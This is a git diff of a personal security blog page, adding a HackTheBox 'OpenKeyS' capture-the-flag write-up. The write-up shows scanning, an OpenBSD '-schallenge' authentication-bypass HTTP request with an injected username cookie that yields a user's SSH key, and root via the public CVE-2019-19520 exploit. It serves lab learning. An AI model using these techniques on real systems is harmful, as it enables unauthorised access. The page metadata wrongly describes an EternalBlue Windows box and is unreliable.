@@ -79,7 +79,7 @@
 <link href="/assets/css/main.css?v=1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="writeup, b4bygroot, infosec" />
+  <meta name="keywords" content="Linux,OpenBSD,Authentication Vulnerability,without metasploit,Local Privilege Escalation,CVE-2019-19520," />
 
 
 
@@ -105,17 +105,23 @@
 
 
 
-<meta name="description" content="Ramblings, Facepalms and Writeups from my InfoSec Journey">
-<meta name="keywords" content="writeup, b4bygroot, infosec">
-<meta property="og:type" content="website">
-<meta property="og:title" content="b4bygroot">
-<meta property="og:url" content="http://localhost:4000/">
+<meta name="description" content="A retired windows box from HackTheBox, vulnerable to EternalBlue (MS17-010), exploited manually and gained SYSTEM access.">
+<meta name="keywords" content="Linux, OpenBSD, Authentication Vulnerability, without metasploit, Local Privilege Escalation, CVE-2019-19520">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OpenKeyS Machine Writeup- HackTheBox">
+<meta property="og:url" content="http://localhost:4000/2020/12/10/HTB_Openkeys_Writeup/">
 <meta property="og:site_name" content="b4bygroot">
-<meta property="og:description" content="Ramblings, Facepalms and Writeups from my InfoSec Journey">
+<meta property="og:description" content="A retired windows box from HackTheBox, vulnerable to EternalBlue (MS17-010), exploited manually and gained SYSTEM access.">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="/assets/images/OpenKeyS/info.png">
+<meta property="og:image" content="/assets/images/OpenKeyS/jennifer_key.png">
+<meta property="og:image" content="/assets/images/OpenKeyS/usershell.png">
+<meta property="og:image" content="/assets/images/OpenKeyS/rootshell.png">
+<meta property="og:image" content="/assets/images/OpenKeyS/sysown.png">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="b4bygroot">
-<meta name="twitter:description" content="Ramblings, Facepalms and Writeups from my InfoSec Journey">
+<meta name="twitter:title" content="OpenKeyS Machine Writeup- HackTheBox">
+<meta name="twitter:description" content="A retired windows box from HackTheBox, vulnerable to EternalBlue (MS17-010), exploited manually and gained SYSTEM access.">
+<meta name="twitter:image" content="/assets/images/OpenKeyS/info.png">
 
 
 <script type="text/javascript" id="hexo.configurations">
@@ -148,7 +154,7 @@
 
 
 
-  <title>b4bygroot</title>
+  <title>OpenKeyS Machine Writeup- HackTheBox | b4bygroot</title>
   
 
 
@@ -182,7 +188,7 @@
   
   
 
-  <div class="container sidebar-position-right page-home ">
+  <div class="container sidebar-position-right page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -330,12 +336,9 @@
           <div id="content" class="content">
             
 
-
-
-<section id="posts" class="posts-expand">
+<div id="posts" class="posts-expand">
   
-    
-    
+  
 
   
 
@@ -364,12 +367,7 @@
           <h2 class="post-title" itemprop="name headline">
           
           
-            
-                
-                <a class="post-title-link" href="/2020/12/10/HTB_Openkeys_Writeup/" itemprop="url">
-                OpenKeyS Machine Writeup- HackTheBox
-              </a>
-            
+            OpenKeyS Machine Writeup- HackTheBox
           
         </h2>
         
@@ -454,6 +452,12 @@
           
 
           
+            
+                <div class="post-description">
+                    
+                </div>
+            
+          
 
         </div>
       </header>
@@ -466,778 +470,342 @@
 
       
         
-          <div class="post-thumbnail text-center">
-          <a><img src="/assets/images/OpenKeyS/info.png" width="400" align="center"/></a>
-          </div>
-          
-  A retired windows box from HackTheBox, vulnerable to EternalBlue (MS17-010), exploited manually and gained SYSTEM access.
+  <p><img src="/assets/images/OpenKeyS/info.png" alt="Info" /></p>
 
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/12/10/HTB_Openkeys_Writeup/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+<h1 id="methodology">Methodology</h1>
+<ol>
+  <li>Open Port Enumeration</li>
+  <li>Web Service Enumeration</li>
+  <li>Authentication Vulnerability identified</li>
+  <li>User SSH private key identified</li>
+  <li>User shell gained</li>
+  <li>Local Privilege Escalation Vulnerability identified</li>
+  <li>Root shell gained</li>
+</ol>
+
+<h1 id="lessons-learned">Lessons Learned</h1>
+<ol>
+  <li>OpenBSD Authentication Bypass Vulnerability</li>
+  <li>Local Privilege Escalation</li>
+</ol>
+
+<h1 id="open-ports-enumeration">Open Ports Enumeration</h1>
+<p>The open ports enumeration through targetRecon<sup id="fnref:fn1" role="doc-noteref"><a href="#fn:fn1" class="footnote">1</a></sup>, had identified two open ports namely, <strong>SSH</strong> (22) and 
+<strong>HTTP</strong> (80). The scan had not identified any known vulnerabilities on the target. The results of the scan are shown
+below.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌[b4bygroot☮arcolinux]-(~/HTB/OpenKeyS)
+└&gt; targetRecon 10.10.10.199
+[+] Open Ports Scan
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+        22      ssh
+        80      http
+[+] Scripts Scan
+                 nmap -sV -A --script=default,vuln -p 22 10.10.10.199
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-10 00:30 IST
+Nmap scan report for 10.10.10.199 (10.10.10.199)
+Host is up (0.20s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
+| ssh-hostkey: 
+|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
+|_  256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.95 seconds
+
+                 nmap -sV -A --script=default,vuln -p 80 10.10.10.199
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-10 00:30 IST
+Nmap scan report for 10.10.10.199 (10.10.10.199)
+Host is up (0.20s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    OpenBSD httpd
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-title: Site doesn't have a title (text/html).
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 580.15 seconds
+
+[+] Summary 
+22      ssh     OpenSSH 8.1
+                No vuln found
+80      http    OpenBSD httpd N/A
+                No vuln found
+</code></pre></div></div>
+
+<h1 id="web-service-enumeration">Web Service Enumeration</h1>
+<p>Browsing to <a href="http://openkeys.htb">http://openkeys.htb</a> had revealed a login page that is supposed to retrieve <strong>SSH
+Private Key</strong> for the authenticated user. Following this, a <strong>gobuster</strong> scan was carried out, that had identified an
+interesting directory named <strong>includes</strong>. The partial results of the scan are given below.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>λ arcolinux OpenKeyS → gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.10.199
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://10.10.10.199
+<span class="o">[</span>+] Method:         GET
+<span class="o">[</span>+] Threads:        10
+<span class="o">[</span>+] Wordlist:       /usr/share/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.1.0
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/12/10 01:31:25 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/images <span class="o">(</span>Status: 301<span class="o">)</span>        
+/css <span class="o">(</span>Status: 301<span class="o">)</span>            
+/includes <span class="o">(</span>Status: 301<span class="o">)</span>       
+/js <span class="o">(</span>Status: 301<span class="o">)</span>             
+/vendor <span class="o">(</span>Status: 301<span class="o">)</span>          
+/fonts <span class="o">(</span>Status: 301<span class="o">)</span>    
+<span class="nt">---SNIP---</span>
+</code></pre></div></div>
+<p>Browsing to <a href="http://openkeys.htb/includes">http://openkeys.htb/includes</a> had revealed two files listed on the directory,
+named <strong>auth.php</strong> and <strong>auth.php.swp</strong>. Both the files were downloaded onto the attacking host for further analysis. 
+Although the extension from <em>auth.php.swp</em> indicates that this is a <em>swap</em> file, the <strong>file</strong> command had identified few 
+key information about the file such as username and host. The same is given on the section below.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ξ HTB/OpenKeyS → file auth.php.swp 
+auth.php.swp: Vim swap file, version 8.1, pid 49850, user jennifer, host openkeys.htb, file /var/www/htdocs/includes/auth.php
+</code></pre></div></div>
+<p>Examining the contents of the <em>swap</em> file using <strong>vim</strong> as <code class="language-plaintext highlighter-rouge">vim -r auth.php.swp</code> had revealed that the <em>authenticate</em> 
+function executes a binary, <strong>check_auth</strong> present on <em>auth_helpers/check_auth</em>. The partial contents of the swap 
+file is given below.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="k">function</span> <span class="n">authenticate</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">escapeshellcmd</span><span class="p">(</span><span class="s2">"../auth_helpers/check_auth "</span> <span class="mf">.</span> <span class="nv">$username</span> <span class="mf">.</span> <span class="s2">" "</span> <span class="mf">.</span> <span class="nv">$password</span><span class="p">);</span>
+	<span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$retcode</span><span class="p">);</span>
+	<span class="k">return</span> <span class="nv">$retcode</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="o">---</span><span class="no">SNIP</span><span class="o">---</span>
+</code></pre></div></div>
+<p>The binary <em>check_auth</em> was downloaded by browsing to 
+<a href="http://openkeys.htb/auth_helpers/check_auth">http://openkeys.htb/auth_helpers/check_auth</a>, and analyzed for an attack
+vector.</p>
+
+<h1 id="initial-foothold">Initial Foothold</h1>
+<p>Analyzing the file <em>check_auth</em> with <strong>strings</strong> as <code class="language-plaintext highlighter-rouge">strings check_auth</code> had revealed few key information, about the
+target including <strong>OpenBSD</strong> and <strong>auth_userkey</strong>.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>λ arcolinux OpenKeyS → strings check_auth 
+/usr/libexec/ld.so
+OpenBSD
+libc.so.95.1
+_csu_finish
+<span class="nb">exit
+</span>_Jv_RegisterClasses
+atexit
+auth_userokay
+<span class="nt">---SNIP---</span>
+</code></pre></div></div>
+<p>Searching for the combination- <em>OpenBSD</em> and <em>check_auth</em> had revealed an <strong>authentication bypass vulnerability in 
+OpenBSD</strong> <sup id="fnref:fn2" role="doc-noteref"><a href="#fn:fn2" class="footnote">2</a></sup> <sup id="fnref:fn3" role="doc-noteref"><a href="#fn:fn3" class="footnote">3</a></sup>. The vulnerability states that authentication on OpenBSD can be bypassed by using <strong>-schallenge</strong>
+as the username with any password. Attempting the same on the login from <a href="http://openkeys.htb">http://openkeys.htb</a>
+had managed to bypass authentication, but had ultimately failed in retrieving SSH keys as the target has no user
+<em>-schallenge</em>. Having found a valid username <strong>jennifer</strong> from the swap file, <em>auth.php.swp</em>, a viable method would be to
+try and retrieve the SSH key for <em>jennifer</em>. To that effect, the login request was intercepted with <em>BurpSuite</em> and
+a new cookie field, <em>username</em> was added to the request as 
+<code class="language-plaintext highlighter-rouge">Cookie: PHPSESSID=9h0gbbeul2m6v82drk6eqe3ukb;username=jennifer</code>. The modified request is given below.</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">openkeys.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">38</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://openkeys.htb</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://openkeys.htb/index.php</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=9h0gbbeul2m6v82drk6eqe3ukb;username=jennifer</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+
+username=-schallenge&amp;password=password
+</code></pre></div></div>
+<p>Forwarding the modified request had presented the <em>SSH Private Key</em> of the user <em>jennifer</em> and the same is shown on the
+screenshot given below.
+<img src="/assets/images/OpenKeyS/jennifer_key.png" alt="SSH Key" /></p>
+
+<p>The received key was copied onto a file, named <strong>jennifer.key</strong>, and given appropriate key permissions. An attempt to 
+access the target via., <strong>SSH</strong> as the user <em>jennifer</em> was carried out as <code class="language-plaintext highlighter-rouge">ssh -i jennifer.key jennifer@openkeys.htb</code>. 
+This gave complete access to the target as the user <em>jennifer</em> and the user flag was read. The same is shown below.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ξ HTB/OpenKeyS → ssh <span class="nt">-i</span> jennifer.key jennifer@openkeys.htb 
+The authenticity of host <span class="s1">'openkeys.htb (10.10.10.199)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:gzhq4BokiWZ1NNWrblA8w3hLOhlhoRy+NFyi2smBZOA.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>openkeys.htb,10.10.10.199<span class="s1">' (ECDSA) to the list of known hosts.
+Last login: Wed Jun 24 09:31:16 2020 from 10.10.14.2
+OpenBSD 6.6 (GENERIC) #353: Sat Oct 12 10:45:56 MDT 2019
+
+Welcome to OpenBSD: The proactively secure Unix-like operating system.
+
+Please use the sendbug(1) utility to report bugs in the system.
+Before reporting a bug, please try to reproduce it with the latest
+version of the code.  With bug reports, please try to ensure that
+enough information to reproduce the problem is enclosed, and if a
+known fix for it exists, include that as well.
+
+openkeys$ id
+uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
+openkeys$ pwd
+/home/jennifer
+openkeys$ cat user.txt                                                                                                                                                                                       
+36ab2---REDACTED---d2b10
+</span></code></pre></div></div>
+<p><img src="/assets/images/OpenKeyS/usershell.png" alt="User Shell" /></p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>With user access to the target established, enumeration further for privilege escalation was carried out. 
+The <strong>uname -a</strong> command had identified the installed OS and version as <strong>OpenBSD 6.6</strong>, shown below.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openkeys<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
+OpenBSD openkeys.htb 6.6 GENERIC#353 amd64
+</code></pre></div></div>
+<p><em>Google-Fu</em> had listed a privilege escalation vector, <strong>CVE-2019-19520</strong> <sup id="fnref:fn4" role="doc-noteref"><a href="#fn:fn4" class="footnote">4</a></sup> and a working exploit <sup id="fnref:fn5" role="doc-noteref"><a href="#fn:fn5" class="footnote">5</a></sup> had been 
+identified. The exploit script was copied onto a file, <strong>privEsc.sh</strong>, on the target, given executable permissions and 
+executed. This gave complete <em>root</em> access to the target and the root flag was read. The same is shown below.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openkeys<span class="nv">$ </span>vi privEsc.sh
+openkeys<span class="nv">$ </span><span class="nb">chmod</span> +x privEsc.sh                                                                                                                                                                                
+openkeys<span class="nv">$ </span>./privEsc.sh                                                                                                                                                                                       
+openbsd-authroot <span class="o">(</span>CVE-2019-19520 / CVE-2019-19522<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> checking system ...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> system supports S/Key authentication
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">id</span>: <span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>jennifer<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>jennifer<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>jennifer<span class="o">)</span>, 0<span class="o">(</span>wheel<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> compiling ...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> running Xvfb ...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> testing <span class="k">for </span>CVE-2019-19520 ...
+_XSERVTransmkdir: ERROR: euid <span class="o">!=</span> 0,directory /tmp/.X11-unix will not be created.
+<span class="o">[</span>+] success! we have auth group permissions
+
+WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL <span class="o">(</span>CTRL+C<span class="o">)</span><span class="nb">.</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> trying CVE-2019-19522 <span class="o">(</span>S/Key<span class="o">)</span> ...
+Your password is: EGG LARD GROW HOG DRAG LAIN
+otp-md5 99 obsd91335
+S/Key Password:
+openkeys# <span class="nb">id                                                                                                                                                                                            
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span>, 2<span class="o">(</span>kmem<span class="o">)</span>, 3<span class="o">(</span>sys<span class="o">)</span>, 4<span class="o">(</span><span class="nb">tty</span><span class="o">)</span>, 5<span class="o">(</span>operator<span class="o">)</span>, 20<span class="o">(</span>staff<span class="o">)</span>, 31<span class="o">(</span>guest<span class="o">)</span>
+openkeys# <span class="nb">cat</span> /root/root.txt                                                                                                                                                                                 
+f3a55---REDEACTED---c6efa
+</code></pre></div></div>
+<p><img src="/assets/images/OpenKeyS/rootshell.png" alt="Root Shell" /></p>
+
+<h1 id="system-owned">System Owned</h1>
+<p><img src="/assets/images/OpenKeyS/sysown.png" alt="System Owned" /></p>
+
+<h1 id="resources">Resources</h1>
+<div class="footnotes" role="doc-endnotes">
+  <ol>
+    <li id="fn:fn1" role="doc-endnote">
+      <p><a href="https://github.com/b4bygroot/TargetRecon">targetRecon</a> <a href="#fnref:fn1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:fn2" role="doc-endnote">
+      <p><a href="https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt">Authentication vulnerabilities in OpenBSD</a> <a href="#fnref:fn2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:fn3" role="doc-endnote">
+      <p><a href="https://nakedsecurity.sophos.com/2019/12/06/openbsd-devs-patch-authentication-bypass-bug/">OpenBSD devs patch authentication bypass bug</a> <a href="#fnref:fn3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:fn4" role="doc-endnote">
+      <p><a href="https://packetstormsecurity.com/files/cve/CVE-2019-19520">CVE-2019-19520</a> <a href="#fnref:fn4" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:fn5" role="doc-endnote">
+      <p><a href="https://github.com/bcoles/local-exploits/tree/master/CVE-2019-19520">bcoles/local-exploits/CVE-2019-19520</a> <a href="#fnref:fn5" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+  </ol>
+</div>
+
+
+      
+    </div>
+
+    <div>
+      
         
+
       
     </div>
 
     <div>
       
-    </div>
+        
 
-    <div>
       
     </div>
 
     <div>
+      
+        
+
       
     </div>
 
     <footer class="post-footer">
       
-
-      
-
-      
-
-      
-        
-        
-        
-        
-          <div class="post-eof"></div>
-        
-      
-    </footer>
-  </article>
-
-  
-    
-    
-
-  
-
-  
-  
-  
-
-  <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://localhost:4000/2020/12/09/HTB_Blue_Writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="b4bygroot">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/assets/images/author.jpeg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="b4bygroot">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-          
+        <div class="post-tags">
           
             
-                
-                <a class="post-title-link" href="/2020/12/09/HTB_Blue_Writeup/" itemprop="url">
-                Blue Machine Writeup- HackTheBox
+            <a href="/tag/#/Linux" rel="tag"># Linux</a>
+          
+            
+            <a href="/tag/#/OpenBSD" rel="tag"># OpenBSD</a>
+          
+            
+            <a href="/tag/#/Authentication%20Vulnerability" rel="tag"># Authentication Vulnerability</a>
+          
+            
+            <a href="/tag/#/without%20metasploit" rel="tag"># without metasploit</a>
+          
+            
+            <a href="/tag/#/Local%20Privilege%20Escalation" rel="tag"># Local Privilege Escalation</a>
+          
+            
+            <a href="/tag/#/CVE-2019-19520" rel="tag"># CVE-2019-19520</a>
+          
+        </div>
+      
+
+      
+      
+      
+      
+      
+
+      
+      
+        <div class="post-nav" id="post-nav-id">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/12/09/HTB_Blue_Writeup/" rel="prev" title="Blue Machine Writeup- HackTheBox">
+                Blue Machine Writeup- HackTheBox <i class="fa fa-chevron-right"></i>
               </a>
             
-          
-        </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-12-09T16:00:00+05:30">
-                2020-12-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/category/#/HTB" itemprop="url" rel="index">
-                    <span itemprop="name">HTB</span>
-                  </a>
-                </span>
-
-                
-                
-                  , 
-                
-              
-                
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/category/#/Writeup" itemprop="url" rel="index">
-                    <span itemprop="name">Writeup</span>
-                  </a>
-                </span>
-
-                
-                
-                  , 
-                
-              
-                
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/category/#/Machine" itemprop="url" rel="index">
-                    <span itemprop="name">Machine</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
       
       
 
-      
-        
-          <div class="post-thumbnail text-center">
-          <a><img src="/assets/images/Blue/info.png" width="400" align="center"/></a>
-          </div>
-          
-  A retired windows box from HackTheBox, vulnerable to EternalBlue (MS17-010), exploited manually and gained SYSTEM access.
-
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/12/09/HTB_Blue_Writeup/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-        
-        
-        
-        
-          <div class="post-eof"></div>
-        
       
     </footer>
   </article>
 
-  
+  <div class="post-spread">
     
-    
-
-  
-
-  
-  
-  
-
-  <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://localhost:4000/2020/12/08/HTB_Netmon-Writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="b4bygroot">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/assets/images/author.jpeg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="b4bygroot">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-          
-          
-            
-                
-                <a class="post-title-link" href="/2020/12/08/HTB_Netmon-Writeup/" itemprop="url">
-                Netmon Machine Writeup- HackTheBox
-              </a>
-            
-          
-        </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-12-08T05:00:00+05:30">
-                2020-12-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/category/#/HTB" itemprop="url" rel="index">
-                    <span itemprop="name">HTB</span>
-                  </a>
-                </span>
-
-                
-                
-                  , 
-                
-              
-                
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/category/#/Writeup" itemprop="url" rel="index">
-                    <span itemprop="name">Writeup</span>
-                  </a>
-                </span>
-
-                
-                
-                  , 
-                
-              
-                
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/category/#/Machine" itemprop="url" rel="index">
-                    <span itemprop="name">Machine</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <div class="post-thumbnail text-center">
-          <a><img src="/assets/images/Netmon/info.png" width="400" align="center"/></a>
-          </div>
-          
-  A retired windows box from HackTheBox, gained foothold by abusing anonymous FTP login, and then elevated privileges through authenticated RCE exploit on PRTG Network Monitor.
-
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/12/08/HTB_Netmon-Writeup/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-        
-        
-        
-        
-          <div class="post-eof"></div>
-        
-      
-    </footer>
-  </article>
-
-  
-    
-    
-
-  
-
-  
-  
-  
-
-  <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://localhost:4000/2020/12/03/HTB_Jerry_Writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="b4bygroot">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/assets/images/author.jpeg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="b4bygroot">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-          
-          
-            
-                
-                <a class="post-title-link" href="/2020/12/03/HTB_Jerry_Writeup/" itemprop="url">
-                Jerry Machine Writeup- HackTheBox
-              </a>
-            
-          
-        </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-12-03T16:00:00+05:30">
-                2020-12-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/category/#/HTB" itemprop="url" rel="index">
-                    <span itemprop="name">HTB</span>
-                  </a>
-                </span>
-
-                
-                
-                  , 
-                
-              
-                
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
